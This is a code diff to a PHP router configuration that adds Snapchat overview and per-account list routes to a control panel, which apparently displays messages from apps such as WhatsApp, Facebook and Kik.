@@ -82,6 +82,7 @@ $di->setShared('router', function() use($config, $di) {
     $router->add(Modules::FACEBOOK, new \System\Router\Route('/cp/facebook', array('controller' => 'Facebook', 'action' => 'index')));
     $router->add(Modules::VK, new \System\Router\Route('/cp/vk', array('controller' => 'Vk', 'action' => 'index')));
     $router->add(Modules::KIK, new \System\Router\Route('/cp/kik', array('controller' => 'Kik', 'action' => 'index')));
+    $router->add(Modules::SNAPCHAT, new \System\Router\Route('/cp/snapchat', array('controller' => 'Snapchat', 'action' => 'index')));
     $router->add(Modules::EMAILS, new \System\Router\Route('/cp/emails', array('controller' => 'Emails', 'action' => 'index')));
     $router->add(Modules::NOTES, new \System\Router\Route('/cp/notes', array('controller' => 'Notes', 'action' => 'index')));
     $router->add(Modules::APPLICATIONS, new \System\Router\Route('/cp/applications', array('controller' => 'Applications', 'action' => 'index')));
@@ -141,6 +142,7 @@ $di->setShared('router', function() use($config, $di) {
     $router->add('whatsappList', new \System\Router\Regex('/cp/whatsapp/:tab/:id', array('controller' => 'Whatsapp', 'action' => 'list'), array('tab' => 'private|group', 'id' => '[0-9]+')));
     $router->add('facebookList', new \System\Router\Regex('/cp/facebook/:account/:tab/:id', array('controller' => 'Facebook', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[a-zA-Z0-9\:]+')));
     $router->add('kikList', new \System\Router\Regex('/cp/kik/:account/:tab/:id', array('controller' => 'Kik', 'action' => 'list'), array('account' => '[^/]+', 'tab' => 'private|group', 'id' => '[^/]+')));
+    $router->add('snapchatList', new \System\Router\Regex('/cp/snapchat/:account/:id', array('controller' => 'Snapchat', 'action' => 'list'), array('account' => '[^/]+', 'id' => '[^/]+')));
     $router->add('emailsSelected', new \System\Router\Regex('/cp/emails/:account', array('controller' => 'Emails', 'action' => 'index'), array('account' => '[^/]+'))); //[-._@a-zA-Z0-9]{6,60}
     $router->add('emailsView', new \System\Router\Regex('/cp/emails/:account/:timestamp', array('controller' => 'Emails', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
     $router->add('notesView', new \System\Router\Regex('/cp/notes/:account/:timestamp', array('controller' => 'Notes', 'action' => 'view'), array('account' => '[^/]+', 'timestamp' => '[\d]{1,10}')));
